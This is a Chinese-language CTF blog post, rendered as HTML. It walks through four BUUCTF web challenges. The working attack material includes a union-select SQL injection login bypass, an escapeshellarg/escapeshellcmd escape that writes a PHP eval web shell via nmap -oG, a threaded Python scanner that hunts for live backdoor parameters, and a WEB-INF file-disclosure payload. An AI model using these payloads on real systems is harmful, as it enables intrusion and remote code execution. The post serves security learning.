@@ -1,0 +1,739 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>buuctf-web-6 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="[GXYCTF2019]BabySQli1–union select特性 [BUUCTF 2018]Online Tool–绕过escapeshellarg、escapeshellcmd [强网杯 2019]高明的黑客–shell脚本筛查 [RoarCTF 2019]Easy Java–WEB-INF配置文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-web-6">
+<meta property="og:url" content="http://example.com/2021/05/20/buuctf/buuctf-web-6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[GXYCTF2019]BabySQli1–union select特性 [BUUCTF 2018]Online Tool–绕过escapeshellarg、escapeshellcmd [强网杯 2019]高明的黑客–shell脚本筛查 [RoarCTF 2019]Easy Java–WEB-INF配置文件">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img04.sogoucdn.com/app/a/100520146/58B7AC39609120DA830B5195BDB056C2">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/195049B8D6EEFA89A69054005CCCAEB6">
+<meta property="og:image" content="https://img02.sogoucdn.com/app/a/100520146/9FEED310C7B9F4B02BEACB5E264DEB10">
+<meta property="og:image" content="https://img03.sogoucdn.com/app/a/100520146/D59DEB5F5284E84D8490B1778B779497">
+<meta property="og:image" content="https://img03.sogoucdn.com/app/a/100520146/ACC3A7966FF0007D7FA93C22481C712A">
+<meta property="og:image" content="https://img04.sogoucdn.com/app/a/100520146/6F24A03B845AC88D74A2B46411C4B7C6">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/7B916E061625913961F84E7290660786">
+<meta property="og:image" content="https://img04.sogoucdn.com/app/a/100520146/3C1687198C9E04E625D1A8337C429722">
+<meta property="og:image" content="https://img03.sogoucdn.com/app/a/100520146/6906264FF89E43ED9A8AD2FB6A9911B8">
+<meta property="og:image" content="https://img04.sogoucdn.com/app/a/100520146/7527BD61620A2465C3F9B537C03C1C7E">
+<meta property="og:image" content="https://img04.sogoucdn.com/app/a/100520146/9110C738EB43EE7750988BAFD915D794">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/1B7A16167195DDA121A6C0DB46D1AC9D">
+<meta property="og:image" content="https://img02.sogoucdn.com/app/a/100520146/5DDCDBBB05377ACF9F811D53FE4D60ED">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/FA75AB957576DFDAE9AB75087BF6E505">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/636A28F5FCED1609164FED4AC299F21E">
+<meta property="og:image" content="https://img02.sogoucdn.com/app/a/100520146/8B4F696245E9BE6D599A9FFFBD35D5CD">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/2B010886F89DFFF146B9FFB4FC6E4B8B">
+<meta property="og:image" content="https://img03.sogoucdn.com/app/a/100520146/ECA794D949F25243762A03226037D215">
+<meta property="og:image" content="https://img03.sogoucdn.com/app/a/100520146/06DEED42583A90AC99965EE74E6C980D">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/7D5DCBA6CF13732AE864E1FF8EDBC218">
+<meta property="og:image" content="https://img02.sogoucdn.com/app/a/100520146/E0629F5886A04A8088F157332C3D58D1">
+<meta property="og:image" content="https://img02.sogoucdn.com/app/a/100520146/5C5D477548870F2B1BAC372B3B1FF102">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/9FDDAE941CE0D31FBA57B2815995B4A0">
+<meta property="og:image" content="https://img02.sogoucdn.com/app/a/100520146/44FE9B0A72B28FB624066B1C0B4279CB">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/51FD765AFB6E9C12378E260B54E1DEAC">
+<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/4D810033E21FDB57C1ACEDB119BA1EC8">
+<meta property="og:image" content="https://img02.sogoucdn.com/app/a/100520146/11F82484EDD46887C2BFAFF426A5169E">
+<meta property="article:published_time" content="2021-05-20T12:03:03.000Z">
+<meta property="article:modified_time" content="2021-05-23T11:05:57.557Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="SQLi">
+<meta property="article:tag" content="java-WEB-INF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img04.sogoucdn.com/app/a/100520146/58B7AC39609120DA830B5195BDB056C2">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2021/05/20/buuctf/buuctf-web-6/" title="buuctf-web-6" itemprop="url">buuctf-web-6</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2021-05-20T12:03:03.000Z" itemprop="datePublished"> Published 2021-05-20</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabySQli1"><span class="toc-number">1.</span> <span class="toc-text">[GXYCTF2019]BabySQli1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">2.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">3.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">4.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li></ol>
+		
+		</div>
+		
+		<p>[GXYCTF2019]BabySQli1–union select特性</p>
+<p>[BUUCTF 2018]Online Tool–绕过escapeshellarg、escapeshellcmd</p>
+<p>[强网杯 2019]高明的黑客–shell脚本筛查</p>
+<p>[RoarCTF 2019]Easy Java–WEB-INF配置文件</p>
+<span id="more"></span>
+
+<h3 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a><strong>[GXYCTF2019]BabySQli1</strong></h3><p><img src="https://img04.sogoucdn.com/app/a/100520146/58B7AC39609120DA830B5195BDB056C2"> </p>
+<p>随便输入试试</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/195049B8D6EEFA89A69054005CCCAEB6"> </p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/9FEED310C7B9F4B02BEACB5E264DEB10"> </p>
+<p>根据提示不同，可以看到确实是存在admin用户的，</p>
+<p>尝试一下注入，开始的时候在pw字段进行注入，但是尝试了很多之后，都提示wrong pass</p>
+<p>在name字段进行测试，</p>
+<p>发送name=admin’发现有报错，</p>
+<p><img src="https://img03.sogoucdn.com/app/a/100520146/D59DEB5F5284E84D8490B1778B779497"> </p>
+<p>name=admin’的话，提示wrong usr，</p>
+<p>所以，应该是单引号字符型注入，尝试了</p>
+<p>name=admin’+and+0#&amp;pw=1   报错wrong usr</p>
+<p>name=admin’+and+1#&amp;pw=1   报错wrong pass</p>
+<p>and语句被执行了，尝试or，发现or被过滤了，但是Or可以绕过，所以接下来使用Order by来探测列数，发现有三列</p>
+<p><img src="https://img03.sogoucdn.com/app/a/100520146/ACC3A7966FF0007D7FA93C22481C712A"> </p>
+<p>接下来使用联合注入，发现括号被过滤了，，，，，，那该怎么办</p>
+<p>不会做了，只能百度了。。。。。。</p>
+<p>看了wp之后，发现是要利用sql语句的特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p>
+<p><img src="https://img04.sogoucdn.com/app/a/100520146/6F24A03B845AC88D74A2B46411C4B7C6"> </p>
+<p>构造payload</p>
+<p>name=1’+union+select+1,’admin’,’123’#&amp;pw=123</p>
+<p>但是还是提示wrong pass</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/7B916E061625913961F84E7290660786"> </p>
+<p>原来是因为，数据库中存储的是MD5，所以要把123的MD5值存进去，</p>
+<p>name=1’+union+select+1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
+<p><img src="https://img04.sogoucdn.com/app/a/100520146/3C1687198C9E04E625D1A8337C429722"></p>
+<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a><strong>[BUUCTF 2018]Online Tool</strong></h3><p>打开题目，直接给出源码，代码审计</p>
+<p><img src="https://img03.sogoucdn.com/app/a/100520146/6906264FF89E43ED9A8AD2FB6A9911B8"> </p>
+<p>这里涉及到两个函数，具体使用方法如下：</p>
+<p><strong>escapeshellarg</strong> — 把字符串转码为可以在shell命令里使用的参数</p>
+<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入shell函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell函数包含 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()</a> <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。</p>
+<p><strong>1.确保用户只传递一个参数给命令</strong></p>
+<p><strong>2.用户不能指定更多的参数</strong></p>
+<p><strong>3.用户不能执行不同的命令</strong></p>
+<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
+<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。 </p>
+<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p>
+<p><strong>1.确保用户只执行一个命令</strong></p>
+<p><strong>2.用户可以指定不限数量的参数</strong></p>
+<p><strong>3.用户不能执行不同的命令</strong></p>
+<p>这两个函数在一起用会有些问题</p>
+<p>  传入的参数是：172.17.0.2’ -v -d a=1，经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
+<p>  经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></p>
+<p>  最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以它后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p>
+<p>简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题，然后往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);这有个system来执行命令，而且有传参，肯定是利用这里了。</p>
+<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
+<p>这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</p>
+<p>这时候就只有想想能不能利用nmap来做些什么了。</p>
+<p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件。</p>
+<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了</p>
+<p>?host=’ <?php phpinfo();?> -oG shell.php ‘</p>
+<p>在上面的源码中可以看到，提交之后会返回创建并返回一个文件夹的名称，我们生成的木马就在这个目录下，尝试访问</p>
+<p><img src="https://img04.sogoucdn.com/app/a/100520146/7527BD61620A2465C3F9B537C03C1C7E"> </p>
+<p>写入木马：?host=’ <?php @eval($_POST["cmd"]);?> -oG shell.php ‘</p>
+<p>蚁剑连接：</p>
+<p><img src="https://img04.sogoucdn.com/app/a/100520146/9110C738EB43EE7750988BAFD915D794"> </p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/1B7A16167195DDA121A6C0DB46D1AC9D"> </p>
+<p>测试这两个函数的作用：</p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/5DDCDBBB05377ACF9F811D53FE4D60ED"> </p>
+<blockquote>
+<p>‘ <?php phpinfo();?> -oG shell.php ‘</p>
+</blockquote>
+<blockquote>
+<p>‘’&#39;‘ <?php phpinfo();?> -oG shell.php ‘&#39;‘’</p>
+</blockquote>
+<blockquote>
+<p>‘’\‘’ &lt;?php phpinfo();?&gt; -oG shell.php ‘\‘’’</p>
+</blockquote>
+<p>执行命令时：\ <?php phpinfo();?> -oG shell.php \</p>
+<p><strong>注意payload中：没有空格和引号都是不行的。</strong></p>
+<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a><strong>[强网杯 2019]高明的黑客</strong></h3><p><img src="https://img01.sogoucdn.com/app/a/100520146/FA75AB957576DFDAE9AB75087BF6E505"> </p>
+<p>看到说源码备份到了<a target="_blank" rel="noopener" href="http://www.tar.gz,访问一下,下载下来/">www.tar.gz，访问一下，下载下来</a></p>
+<p>解压之后就很奇怪了，有2000多个文件，</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/636A28F5FCED1609164FED4AC299F21E"> </p>
+<p>随便打开一个看看</p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/8B4F696245E9BE6D599A9FFFBD35D5CD"> </p>
+<p>可以看到有很多shell，但是看起来都不能使用，但是这些shell中应该有可以使用的，因为文件数量太大，需要写脚本筛查（大佬的脚本）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  						<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/Users/17295/Desktop/www/src&quot;</span></span><br><span class="line">os.chdir(filePath)								<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>			<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>				 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">  s1.acquire()												</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;trying  &#x27;</span>+file+ <span class="string">&#x27;   &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:	<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">      gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">      posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">  data = &#123;&#125;						<span class="comment">#所有的$_POST</span></span><br><span class="line">  params = &#123;&#125;					<span class="comment">#所有的$_GET</span></span><br><span class="line">  <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">    params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">    data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    </span><br><span class="line">  url = <span class="string">&#x27;http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/src/&#x27;</span>+file</span><br><span class="line">  req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">  req.close()									<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">  req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">  content = req.text</span><br><span class="line">  <span class="comment">#print(content)</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:				<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">      req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">      content = req.text</span><br><span class="line">      req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">      <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">        req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">        content = req.text</span><br><span class="line">        req.close()								<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:			<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">      param = a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      param = b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">  s1.release() </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">  t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">  t.start()</span><br></pre></td></tr></table></figure>
+
+<p>找到之后payload：</p>
+<p>[<a target="_blank" rel="noopener" href="http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag%5D">http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag]</a>(<a target="_blank" rel="noopener" href="http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat">http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat</a> /flag)</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/2B010886F89DFFF146B9FFB4FC6E4B8B"></p>
+<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a><strong>[RoarCTF 2019]Easy Java</strong></h3><p>打开题目是一个登录界面</p>
+<p><img src="https://img03.sogoucdn.com/app/a/100520146/ECA794D949F25243762A03226037D215"> </p>
+<p>但是我们不知道用户名和密码，但是有个帮助，点击之后</p>
+<p><img src="https://img03.sogoucdn.com/app/a/100520146/06DEED42583A90AC99965EE74E6C980D"> </p>
+<p>似乎是文件包含，尝试读取/etc/passwd</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/7D5DCBA6CF13732AE864E1FF8EDBC218"> </p>
+<p>没有读取到，</p>
+<p>百度一下java.io.FileNotFoundException:{help.docx}，说这个是报错，是因为找不到文件路径的问题。但是这里不知道怎么解决，看了wp之后，说是，看到java.io.FileNotFoundException:{help.docx}这个报错，就是要切换请求方式。。。。。。挺迷的，这里是把get变成post。</p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/E0629F5886A04A8088F157332C3D58D1"> </p>
+<p>有个pk文件，应该是可以下载的</p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/5C5D477548870F2B1BAC372B3B1FF102"> </p>
+<p>就这吗？</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/9FDDAE941CE0D31FBA57B2815995B4A0"> </p>
+<p>尝试一下包含其他文件，</p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/44FE9B0A72B28FB624066B1C0B4279CB"> </p>
+<p>出现了报错信息</p>
+<p>查看了wp</p>
+<p><strong>是考察WEB-INF/web.xml泄露</strong></p>
+<blockquote>
+<p>WEB-INF主要包含一下文件或目录:</p>
+<p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
+<p>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p>
+<p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p>
+<p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</p>
+<p>/WEB-INF/database.properties：数据库配置文件</p>
+</blockquote>
+<p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
+<p><strong>漏洞成因：</strong></p>
+<p>​        通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
+<p>接下来我们还是用post的方法，访问WEB-INF/web.xml</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/51FD765AFB6E9C12378E260B54E1DEAC"> </p>
+<p>将com.wm.ctf.FlagController转化格式，变成WEB-INF/classes/com/wm/ctf/FlagController.class</p>
+<p>Payload: Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</p>
+<p><img src="https://img01.sogoucdn.com/app/a/100520146/4D810033E21FDB57C1ACEDB119BA1EC8"> </p>
+<p>将base64解码之后，</p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/11F82484EDD46887C2BFAFF426A5169E"> </p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/buuctf/">buuctf</a><a href="/tags/SQLi/">SQLi</a><a href="/tags/java-WEB-INF/">java-WEB-INF</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2021/05/20/buuctf/buuctf-web-6/" data-title="buuctf-web-6 | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2021/05/21/buuctf/buuctf-web-7/" title="buuctf-web-7">
+  <strong>上一篇：</strong><br/>
+  <span>
+  buuctf-web-7</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2021/05/16/buuctf/buuctf-web-5/"  title="buuctf-web-5">
+ <strong>下一篇：</strong><br/> 
+ <span>buuctf-web-5
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabySQli1"><span class="toc-number">1.</span> <span class="toc-text">[GXYCTF2019]BabySQli1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">2.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">3.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">4.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
